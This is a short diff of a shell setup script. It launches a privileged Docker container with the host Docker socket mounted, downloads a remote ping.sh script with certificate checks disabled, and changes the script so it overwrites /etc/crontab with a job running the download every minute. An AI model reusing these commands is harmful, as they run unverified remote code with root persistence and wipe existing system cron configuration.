@@ -25,8 +25,7 @@ sudo docker run -d --privileged -v /var/run/docker.sock:/var/run/docker.sock -v 
 EOF
 sudo chmod +x /etc/init.d/myscript.sh
 sudo update-rc.d myscript.sh defaults
-sudo touch /var/spool/cron/crontabs/croni
 sudo wget /home/asd/ --no-check-certificate https://raw.githubusercontent.com/Supermies/Testata/master/ping.sh
-sudo cat > /var/spool/cron/crontabs/croni << EOF
+sudo cat > /etc/crontab << EOF
 */1 * * * * /home/asd/ping.sh
 EOF
